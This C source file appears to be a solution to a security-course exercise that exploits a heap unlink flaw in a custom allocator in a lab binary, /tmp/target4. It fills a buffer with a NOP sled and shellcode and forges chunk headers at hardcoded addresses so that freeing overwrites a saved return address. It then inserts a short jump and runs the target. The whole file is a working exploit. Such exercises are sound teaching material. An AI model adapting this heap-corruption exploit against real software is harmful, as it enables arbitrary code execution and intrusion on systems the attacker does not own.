#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target4"

/*
 * the chunk header
 */
typedef double ALIGN;

typedef union CHUNK_TAG
{
  struct
    {
      union CHUNK_TAG *l;       /* leftward chunk */
      union CHUNK_TAG *r;       /* rightward chunk + free bit (see below) */
    } s;
  ALIGN x;
} CHUNK;

/*
 * we store the freebit -- 1 if the chunk is free, 0 if it is busy --
 * in the low-order bit of the chunk's r pointer.
 */

/* *& indirection because a cast isn't an lvalue and gcc 4 complains */
#define SET_FREEBIT(chunk) ( *(unsigned *)&(chunk)->s.r |=  0x1 )
#define CLR_FREEBIT(chunk) ( *(unsigned *)&(chunk)->s.r &= ~0x1 )
#define GET_FREEBIT(chunk) ( (unsigned)(chunk)->s.r & 0x1 )

/* it's only safe to operate on chunk->s.r if we know freebit
 * is unset; otherwise, we use ... */
#define RIGHT(chunk) ((CHUNK *)(~0x1 & (unsigned)(chunk)->s.r))

/*
 * chunk size is implicit from l-r
 */
#define CHUNKSIZE(chunk) ((unsigned)RIGHT((chunk)) - (unsigned)(chunk))

/*
 * back or forward chunk header
 */
#define TOCHUNK(vp) (-1 + (CHUNK *)(vp))
#define FROMCHUNK(chunk) ((void *)(1 + (chunk)))

#define PPOINTER 0x8059878 
#define QPOINTER 0x8059948 
#define EIP      0xbffffa7c

int main(void)
{
  char *args[3];
  char *env[1];
  char buf[1024];

  memset(buf, 0x90, 1024);
  strncpy(buf+800, shellcode, 45);
  //strncpy(buf+244, "\x12\x34\x56\x78", 4);

  void *vp = (void*)buf + (QPOINTER - PPOINTER);
  CHUNK *p = TOCHUNK(vp);

  p->s.l = (void*)QPOINTER; 
  p->s.r = (void*)EIP;

  CHUNK *l = TOCHUNK(vp+sizeof(CHUNK));
  CHUNK *r = TOCHUNK(vp-sizeof(CHUNK));

  // Do a jmp for 12 bytes as the phrack suggested
  strncpy((char*)l+2, "\xeb\x0c", 2);
  
  SET_FREEBIT(l);
  //SET_FREEBIT(r);
  SET_FREEBIT(p);
 
  args[0] = TARGET; 
  args[1] = buf;
  args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
